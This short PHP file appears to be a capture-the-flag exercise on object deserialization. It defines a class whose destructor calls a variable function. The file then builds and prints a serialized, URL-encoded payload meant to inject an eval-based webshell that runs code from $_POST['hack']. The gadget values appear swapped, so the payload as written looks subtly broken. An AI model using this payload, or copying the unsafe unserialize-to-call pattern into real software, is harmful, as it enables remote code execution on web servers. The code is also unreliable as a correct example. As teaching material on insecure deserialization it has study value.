<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

//@$ppp = unserialize($_GET["data"]);

$c = new HelloPhp();
$c->b =  'eval($_POST[hack]);';
$c->a = "assert";
echo urlencode(serialize($c));
